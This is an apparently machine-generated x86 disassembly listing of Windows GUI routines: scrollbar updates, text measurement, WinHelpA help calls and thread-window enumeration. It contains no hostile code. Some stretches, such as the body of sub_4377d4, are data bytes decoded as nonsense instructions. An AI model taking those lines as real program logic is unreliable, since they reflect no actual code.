mov [ ebx + 0x20c ] edi
mov eax ebx
call sub_4448fc
test al al
je r-xdata
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax ebx
mov si 0xffb3
call sub_40349c
mov eax ebx
call sub_436dc4
test al al
je r-xdata
push 0xffffffff
mov eax [ ebx + 0x214 ]
sub eax [ ebx + 0x20c ]
push eax
push 0x2
mov eax ebx
call sub_4445f8
push eax
call SetScrollPos
push 0xffffffff
mov eax [ ebx + 0x20c ]
push eax
push 0x2
mov eax ebx
call sub_4445f8
push eax
call SetScrollPos
jmp r-xdata
sub_436f7c
push ebx
add esp 0xffffffe4
mov ebx eax
cmp edx [ ebx + 0x218 ]
je r-xdata
add esp 0x1c
pop ebx
retn
cmp edx [ ebx + 0x214 ]
jg r-xdata
mov [ ebx + 0x218 ] edx
mov [ esp ] 0x1c
mov [ esp + 0x10 ] edx
mov [ esp + 0x4 ] 0x2
mov eax ebx
call sub_4448fc
test al al
je r-xdata
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
push 0x2
mov eax ebx
call sub_4445f8
push eax
call SetScrollInfo
sub_437044
push ebx
push esi
push edi
add esp 0xffffffe0
mov edi edx
mov ebx eax
mov esi [ ebx + 0x20c ]
xor eax eax
mov al [ edi + 0x4 ]
cmp eax 0x7
ja r-xdata
mov eax [ ebx + 0x210 ]
cmp esi eax
jge r-xdata
jmp [ eax * 4 + jump_table_437069 ]
mov eax [ ebx + 0x214 ]
cmp esi eax
jle r-xdata
mov esi eax
movzx eax [ ebx + 0x220 ]
imul [ ebx + 0x21c ]
sub esi eax
jmp r-xdata
movzx eax [ ebx + 0x220 ]
imul [ ebx + 0x21c ]
add esi eax
jmp r-xdata
movzx eax [ ebx + 0x222 ]
imul [ ebx + 0x21c ]
sub esi eax
jmp r-xdata
movzx eax [ ebx + 0x222 ]
imul [ ebx + 0x21c ]
add esi eax
jmp r-xdata
mov [ esp + 0x4 ] 0x1c
mov [ esp + 0x8 ] 0x17
lea eax [ esp + 0x4 ]
push eax
push 0x2
mov eax ebx
call sub_4445f8
push eax
call GetScrollInfo
mov esi [ esp + 0x1c ]
mov eax ebx
call sub_436dc4
test al al
jne r-xdata
mov esi [ ebx + 0x210 ]
jmp r-xdata
mov esi [ ebx + 0x214 ]
mov [ esp ] esi
mov ecx esp
mov dl [ edi + 0x4 ]
mov eax ebx
mov si 0xffb2
call sub_40349c
mov edx [ esp ]
mov eax ebx
call sub_436f68
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov esi eax
mov eax [ ebx + 0x214 ]
sub eax esi
mov esi eax
jmp r-xdata
sub_43716c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_4445f8
push eax
mov eax [ ebx + 0x174 ]
push eax
call CallWindowProcA
pop esi
pop ebx
retn
sub_43719c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_440324
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x41
mov eax esi
call sub_43d5b4
mov edx 0x11
mov eax esi
call sub_43d5d8
mov [ esi + 0x209 ] 0x1
mov [ esi + 0x210 ] 0x1
mov eax esi
call sub_43736c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax esi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_43720c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_441484
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_4413b0
mov eax ebx
mov si 0xffc8
call sub_40349c
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x208 ]
mov eax [ eax + edx * 4 ]
mov edx [ edi + 0x4 ]
or edx 0x100
or eax edx
xor edx edx
mov dl [ ebx + 0x20a ]
or eax [ edx * 4 + rw-data ]
mov [ edi + 0x4 ] eax
cmp [ ebx + 0x210 ] 0x0
jne r-xdata
and [ edi + 0x24 ] 0xfffffffe
pop edi
pop esi
pop ebx
retn
or [ edi + 0x4 ] 0x80
sub_43728b
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_437319
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x20c ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437320
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ ebx + 0x210 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43ddf8
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_4551d4
test al al
je r-xdata
mov ebx [ ebx + 0x20c ]
mov eax ebx
mov si 0xffb8
call sub_40349c
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov [ edi + 0xc ] 0x1
sub_43736c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_437444
push [ fs : eax ]
mov [ fs : eax ] esp
test [ ebx + 0x1c ] 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43744b
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404098
retn
cmp [ ebx + 0x209 ] 0x0
je r-xdata
push 0x0
call GetDC
mov esi eax
mov eax [ ebx + 0x68 ]
call sub_41d414
push eax
push esi
call SelectObject
mov edi eax
lea eax [ ebp - 0x8 ]
push eax
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_43ddf8
mov eax [ ebp - 0xc ]
call sub_404334
push eax
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_43ddf8
mov eax [ ebp - 0x10 ]
call sub_404534
push eax
push esi
call GetTextExtentPoint32A
push edi
push esi
call SelectObject
push esi
push 0x0
call ReleaseDC
push 0x5
call GetSystemMetrics
shl eax 0x2
add eax [ ebp - 0x8 ]
push eax
push 0x6
call GetSystemMetrics
shl eax 0x2
add eax [ ebp - 0x4 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_437454
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_43d2c8
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x20c ]
jne r-xdata
xor eax eax
mov [ edi + 0x20c ] eax
sub_4374ec
push ebx
push esi
push edi
mov edi edx
mov ebx eax
call sub_42c584
mov esi eax
mov eax esi
call sub_42c664
test al al
je r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_437590
test al al
je r-xdata
push 0x1
mov eax [ edi + 0x4 ]
push eax
call SetBkMode
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_4445f8
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax esi
call sub_42c7fc
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_437550
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_437590
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43759c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4375c1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4375c8
retn
sub_4376c8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44a508
mov [ esi + 0x60 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax esi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_437704
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_437729
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437730
retn
sub_4377d4
mov ch 0x77
inc ebx
add [ edi - 0x36ffbc89 ] bh
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
add [ ebp + 0x77 ] ch
inc ebx
add [ ebp + 0x77 ] dh
inc ebx
add [ ebp + 0x77 ] bh
inc ebx
add [ ebp - 0x72ffbc89 ] al
ja r-xdata
ja r-xdata
mov edi 0xc9004377
cmp dl ah
ja r-xdata
add [ eax ] al
xchg bx ax
add [ ebp - 0x62ffbc89 ] dl
ja r-xdata
inc ebx
add [ eax ] bl
js r-xdata
cld
mov al 0xe
pop edi
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x6d ] ah
xchg ebp eax
ja r-xdata
cmp dl ah
ja r-xdata
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
add [ ebp - 0x52ffbc89 ] ah
ja r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax + edi * 2 + 0x43 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp - 0x5affbc89 ] bl
ja r-xdata
add [ eax ] al
salc
js r-xdata
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edx * 4 - 0x4 ] ah
lodsd [ esi ]
add [ ebp + 0x77 ] cl
inc ebx
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_40410c
cmp [ ebx + 0x1c ] 0x0
je r-xdata
push cs
push esp
push edi
imul ebp [ esi + 0x48 ] 0x56706c65
imul esp [ ebp + 0x77 ] 0x408d7265
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43799d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_404074
test edi edi
jne r-xdata
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x140040 ] dl
add [ eax ] al
adc [ ebx + 0x42 ] 0x0
sbb al 0x0
add [ eax ] al
add [ eax + eax ] ah
add [ eax ] al
xchg esp eax
adc [ eax ] eax
call 0x6043b8d5
push edi
inc eax
add [ edi + edx * 2 + 0x40 ] ch
add ah bh
xor al 0x40
jns r-xdata
add al al
dec edi
add [ ebp + 0x4d004377 ] ch
ja r-xdata
ja r-xdata
cmp dl ah
ja r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
inc ebx
add [ ebp + 0x77 ] dl
inc ebx
add [ ebp + 0x77 ] bl
inc ebx
add [ ebp + 0x77 ] ah
inc ebx
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
cld
add [ ebp + 0x77 ] al
inc ebx
add [ ebx ] al
add [ eax ] al
add [ esi - 0x6d ] ah
cld
mov al 0xe
pop edi
add al dh
xor al 0x40
add [ edi + edx * 2 + 0x40 ] bh
add [ edx + esi + 0x40 ] dl
add [ ebx + eax * 4 + 0x43 ] bl
inc eax
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edi * 2 + 0x78180043 ] bh
inc ebx
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_4040c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4379a4
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404098
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4043f4
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_4378e8
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43799d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_404074
test edi edi
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_40410c
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_4040c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4379a4
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404098
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4043f4
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_4379b8
push ebx
mov ebx eax
mov eax ebx
call sub_437ce8
cmp [ ebx + 0x1c ] 0x0
je r-xdata
pop ebx
retn
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
lea eax [ ebx + 0x1c ]
call sub_4056e0
sub_4379f4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_437a5b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov ebx 0x1
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_4378e8
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0xc ]
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
mov ebx 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437a62
lea eax [ ebp - 0x4 ]
call sub_404074
retn
sub_437a6c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_437af4
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov ebx eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_4379e0
push [ ebp - 0x8 ]
push r-xdata
push edi
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4043f4
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx edi
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437afb
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404098
retn
sub_437b07
inc [ edx ]
add [ eax ] al
add [ edx ] bh
and [ eax ] al
add [ eax + 0x5590c301 ] dh
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_437b8f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_43822c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437b96
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404098
retn
mov [ ebx + 0x10 ] 0x2
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_4378e8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x0
push 0x3
mov eax [ ebp - 0x4 ]
call sub_404534
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_437b14
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_437b8f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_43822c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437b96
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404098
retn
mov [ ebx + 0x10 ] 0x2
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_4378e8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x0
push 0x3
mov eax [ ebp - 0x4 ]
call sub_404534
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_437b9c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_437c94
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x1c ]
xor edx edx
mov eax ebx
call sub_4378e8
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_408dbc
mov eax ebx
call sub_43822c
test al al
je r-xdata
mov ecx sub_43773c
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_403a2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437c9b
lea eax [ ebp - 0x1c ]
call sub_404074
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404098
retn
lea ecx [ ebp - 0x8 ]
xor edx edx
mov eax ebx
call sub_4378e8
push 0x0
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax ebx
call sub_438184
test al al
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_4040c8
mov eax [ ebp - 0x4 ]
call sub_404534
push eax
push 0x102
mov eax [ ebp - 0x8 ]
call sub_404534
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_437d04
push ebx
mov ebx eax
mov eax ebx
call sub_437ce8
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea eax [ ebx + 0x1c ]
call sub_4056e0
pop ebx
retn
mov eax rw-data
call sub_4056e0
sub_437d34
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_437d8c
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437d93
lea eax [ ebp - 0x4 ]
call sub_404074
retn
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_4378e8
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx eax
sub_437d9c
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x110 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_437e92
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x10c ] esi
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx r-xdata
lea eax [ ebp - 0x104 ]
mov edx 0xff
call sub_408d7c
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_4378e8
mov eax ebx
call sub_43822c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437e99
lea eax [ ebp - 0x110 ]
call sub_404074
lea eax [ ebp - 0x4 ]
call sub_404074
retn
push 0x0
lea eax [ ebp - 0x110 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_4042e4
mov ecx [ ebp - 0x110 ]
mov dl 0x1
mov eax ebx
call sub_438184
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_4042e4
lea eax [ ebp - 0x104 ]
push eax
push 0x102
mov eax [ ebp - 0x4 ]
call sub_404534
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_437eb0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_437f12
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437f19
lea eax [ ebp - 0x8 ]
call sub_404074
retn
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4378e8
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov ebx eax
sub_437f24
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_437fa4
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_4378e8
mov eax ebx
call sub_43822c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437fab
lea eax [ ebp - 0x4 ]
call sub_404074
retn
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_438184
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x0
mov [ ebx + 0x18 ] esi
push esi
push 0x1
mov eax [ ebp - 0x4 ]
call sub_404534
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_437fb4
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_43809f
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax esi
call sub_43822c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4380a6
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_404098
retn
cmp di 0x102
je r-xdata
push 0x0
lea edx [ ebp - 0xc ]
movzx eax di
call sub_40804c
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax esi
call sub_438184
jmp r-xdata
cmp di 0x105
je r-xdata
test al al
je r-xdata
cmp di 0x201
je r-xdata
mov [ esi + 0x10 ] 0x1
lea edx [ ebp - 0x10 ]
movzx eax di
call sub_40804c
mov edx [ ebp - 0x10 ]
lea eax [ esi + 0x14 ]
call sub_4040c8
mov eax [ ebp + 0x8 ]
push eax
movzx eax di
push eax
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4378e8
mov eax [ ebp - 0x14 ]
call sub_404534
push eax
mov eax [ ebp - 0x4 ]
push eax
call WinHelpA
cmp eax 0x1
sbb ebx ebx
inc ebx
cmp di 0xa
je r-xdata
cmp di 0x8
je r-xdata
cmp di 0x1
je r-xdata
cmp di 0x101
jne r-xdata
mov al 0x1
sub_4380b4
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_4087f4
test eax eax
jne r-xdata
mov al [ ebx + 0xc ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0x4 ] esi
mov [ ebx + 0xc ] 0x1
sub_43810f
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_4087d0
test eax eax
jne r-xdata
mov al [ ebx + 0xd ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0xd ] 0x1
mov [ ebx + 0x8 ] esi
sub_438184
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_404524
xor eax eax
push ebp
push sub_4381fa
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x1
lea eax [ ebp - 0x18 ]
call sub_438168
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438201
lea eax [ ebp - 0x4 ]
call sub_404074
retn
cmp bl [ esi + 0x10 ]
jne r-xdata
sub bl 0x1
jb r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ esi + 0x18 ]
setne [ ebp - 0x5 ]
jne r-xdata
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_407d74
test eax eax
setne [ ebp - 0x5 ]
jmp r-xdata
sub_438210
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov al [ esp + 0xd ]
xor al 0x1
add esp 0x10
pop edi
pop esi
retn
sub_43822c
push ebx
push esi
add esp 0xfffffff0
mov esi eax
xor ebx ebx
mov eax esp
call sub_438168
cmp [ esp + 0xc ] 0x0
je r-xdata
mov edx esp
mov eax esi
call sub_43820c
test al al
jne r-xdata
mov eax esp
push eax
push r-xdata
push 0x0
mov eax [ esp + 0x10 ]
push eax
call __imp_GetWindowThreadProcessId
push eax
call EnumThreadWindows
mov eax ebx
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax esi
call sub_438210
test al al
je r-xdata
mov bl 0x1
mov eax esi
call sub_438288
sub_438288
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi eax
xor eax eax
push ebp
push sub_438305
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_437ce8
call GetTickCount
mov ebx eax
push 0x0
call sub_406244
call GetTickCount
sub eax ebx
cmp eax 0x3e8
jbe r-xdata
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_4378e8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43830c
lea eax [ ebp - 0x4 ]
call sub_404074
retn
push 0x0
push 0x9
mov eax [ ebp - 0x4 ]
call sub_404534
push eax
mov eax [ esi + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_438314
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403270
mov eax rw-data
mov edx esi
test edx edx
je r-xdata
add esp 0xfffffff0
call sub_4035c4
call sub_4056f8
mov eax esi
test bl bl
je r-xdata
sub edx 0xffffffe0
mov eax esi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_43835c
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx ebx
